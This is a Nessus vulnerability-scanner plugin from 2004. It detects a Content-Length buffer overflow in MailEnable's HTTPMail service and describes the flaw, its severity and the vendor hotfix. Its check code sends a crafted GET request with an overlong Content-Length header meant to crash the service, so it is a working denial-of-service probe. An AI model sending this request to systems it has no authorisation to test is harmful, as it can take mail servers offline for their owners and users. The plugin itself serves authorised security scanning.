#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14655);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(10838);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"8301");
  }

  name["english"] = "MailEnable HTTPMail Service Content-Length Overflow Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server is affected by a buffer overflow vulnerability. 

Description :

The target is running at least one instance of MailEnable that has a
flaw in the HTTPMail service (MEHTTPS.exe) in the Professional and
Enterprise Editions.  The flaw can be exploited by issuing an HTTP GET
with an Content-Length header exceeding 100 bytes, which causes a
fixed-length buffer to overflow, crashing the HTTPMail service and
possibly allowing for arbitrary code execution. 

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2004-07/1314.html

Solution : 

Upgrade to MailEnable Professional / Enterprise 1.2 or later or apply
the HTTPMail hotfix from 9th August 2004 found at
http://www.mailenable.com/hotfix/

Risk factor : 

Critical / CVSS Base Score : 10 
(AV:R/AC:L/Au:NR/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Content-Length Overflow Vulnerability in MailEnable HTTPMail Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);


# Make sure banner's from MailEnable.
banner = get_http_banner(port:port);
if (banner && egrep(pattern:"^Server: .*MailEnable", string:banner)) {
  # Try to bring it down.
  req = string(
    "GET / HTTP/1.0\r\n",
    "Content-Length: ", crap(length:100, data:"9"), "XXXX\r\n",
    "\r\n"
  );
  debug_print("req='", req, "'.\n");
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  debug_print("res='", res, "'.\n");

  # There's a problem if the web server is down.
  if (isnull(res)) {
    if (http_is_dead(port:port)) security_hole(port);
  }
}
